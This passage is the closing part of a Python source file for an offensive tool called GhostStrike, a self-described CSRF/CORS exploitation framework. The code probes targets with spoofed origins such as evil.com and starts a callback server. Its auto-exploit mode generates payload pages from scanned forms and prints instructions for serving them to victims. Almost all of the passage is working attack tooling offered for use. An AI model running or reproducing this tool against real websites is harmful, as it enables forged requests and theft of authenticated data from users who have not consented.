                print(f"    CSRF Token: {'Yes' if form_data['has_csrf_token'] else Colors.WARNING + ' No'}")
                print(f"    CAPTCHA: {'Yes' if form_data['has_captcha'] else 'No'}")
                print(f"    Inputs: {len(form_data['inputs'])}")
            
            # Check CORS
            print(f"\n{Colors.INFO} Checking CORS configuration...")
            self._check_cors()
            
            return vulnerable_forms
            
        except Exception as e:
            print(f"{Colors.ERROR} Error scanning target: {str(e)}")
            return []
    
    def _check_cors(self):
        """Check for CORS misconfigurations"""
        test_origins = [
            "http://evil.com",
            "https://evil.com", 
            "null",
            "http://localhost",
            f"http://{urllib.parse.urlparse(self.target_url).netloc}.evil.com"
        ]
        
        for origin in test_origins:
            headers = {'Origin': origin}
            try:
                response = self.session.get(self.target_url, headers=headers)
                
                acao = response.headers.get('Access-Control-Allow-Origin', '')
                acac = response.headers.get('Access-Control-Allow-Credentials', '')
                
                if acao:
                    print(f"  Origin: {origin}")
                    print(f"    ACAO: {acao}")
                    print(f"    ACAC: {acac}")
                    
                    # Check for vulnerabilities
                    if acao == '*' and acac == 'true':
                        print(f"    {Colors.VULN} Wildcard with credentials!")
                    elif acao == origin:
                        print(f"    {Colors.VULN} Origin reflected!")
                    elif acao == 'null':
                        print(f"    {Colors.VULN} Null origin accepted!")
                        
            except Exception as e:
                print(f"  {Colors.ERROR} Error testing origin {origin}: {str(e)}")
    
    def generate_payloads(self, form_data, callback_url=None):
        """Generate all payloads for a vulnerable form"""
        if not callback_url:
            # Start callback server if not provided
            if not self.callback_server:
                self.callback_server = CallbackServer()
                self.callback_server.start()
            callback_url = f"http://{socket.gethostbyname(socket.gethostname())}:8888"
        
        # Build parameters from form
        params = {}
        for inp in form_data['inputs']:
            if inp['name']:
                if inp['value']:
                    params[inp['name']] = inp['value']
                elif inp['type'] == 'email':
                    params[inp['name']] = 'test@ghostops.com'
                elif inp['type'] == 'password':
                    params[inp['name']] = 'GhostOps123!'
                else:
                    params[inp['name']] = 'test'
        
        # Generate payloads
        generator = AdvancedPayloadGenerator(
            form_data['full_url'],
            params,
            form_data['method']
        )
        
        # Save payloads
        saved_files = generator.save_payloads()
        
        print(f"\n{Colors.SUCCESS} Generated {len(saved_files)} payload files")
        print(f"{Colors.INFO} Callback URL: {callback_url}")
        
        return saved_files
    
    def auto_exploit(self):
        """Automatically scan and generate exploits"""
        print(f"\n{Colors.INFO} Running auto-exploit mode...")
        
        # Scan for vulnerabilities
        vulnerable_forms = self.scan_target()
        
        if not vulnerable_forms:
            print(f"\n{Colors.WARNING} No obviously vulnerable forms found")
            print(f"{Colors.INFO} Generating bypass payloads anyway...")
            
            # Generate payloads for manual testing
            test_params = {'username': 'admin', 'password': 'password', 'action': 'transfer'}
            generator = AdvancedPayloadGenerator(self.target_url, test_params)
            generator.save_payloads()
        else:
            print(f"\n{Colors.SUCCESS} Found {len(vulnerable_forms)} vulnerable forms!")
            
            # Start callback server
            if not self.callback_server:
                self.callback_server = CallbackServer()
                self.callback_server.start()
            
            # Generate payloads for each vulnerable form
            for i, form in enumerate(vulnerable_forms):
                print(f"\n{Colors.INFO} Generating payloads for form #{i+1}...")
                self.generate_payloads(form)
            
            print(f"\n{Colors.SUCCESS} All payloads generated!")
            print(f"{Colors.INFO} Serve payloads with: python3 -m http.server 80 -d ghoststrike_payloads")
            print(f"{Colors.INFO} Access payloads at: http://YOUR_IP/index.html")

def main():
    parser = argparse.ArgumentParser(
        description='GhostStrike v2.0 - Advanced CSRF/CORS Exploitation Framework',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    parser.add_argument('target', help='Target URL to scan')
    parser.add_argument('-c', '--cookies', help='Cookies (string or JSON file)')
    parser.add_argument('-a', '--auto', action='store_true', help='Auto-exploit mode')
    parser.add_argument('-o', '--output', default='ghoststrike_payloads', help='Output directory')
    parser.add_argument('-p', '--port', type=int, default=8888, help='Callback server port')
    
    args = parser.parse_args()
    
    print(BANNER)
    
    # Parse cookies if provided
    cookies = None
    if args.cookies:
        if os.path.exists(args.cookies):
            with open(args.cookies, 'r') as f:
                cookies = json.load(f)
        else:
            cookies = args.cookies
    
    # Initialize GhostStrike
    gs = GhostStrike(args.target, cookies)
    
    try:
        if args.auto:
            gs.auto_exploit()
            
            # Keep callback server running
            if gs.callback_server:
                print(f"\n{Colors.WARNING} Press Ctrl+C to stop callback server...")
                while True:
                    time.sleep(1)
        else:
            # Manual mode - just scan and generate payloads
            vulnerable_forms = gs.scan_target()
            
            if vulnerable_forms:
                print(f"\n{Colors.SUCCESS} Found vulnerable forms. Generate payloads? [Y/n]")
                if input().lower() != 'n':
                    for form in vulnerable_forms:
                        gs.generate_payloads(form)
            else:
                print(f"\n{Colors.INFO} Generate bypass payloads anyway? [Y/n]")
                if input().lower() != 'n':
                    test_params = {'test': 'value'}
                    generator = AdvancedPayloadGenerator(args.target, test_params)
                    generator.save_payloads(args.output)
                    
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING} Interrupted by user")
    except Exception as e:
        print(f"\n{Colors.ERROR} Error: {str(e)}")
    finally:
        if gs.callback_server:
            gs.callback_server.stop()

if __name__ == "__main__":
    main()
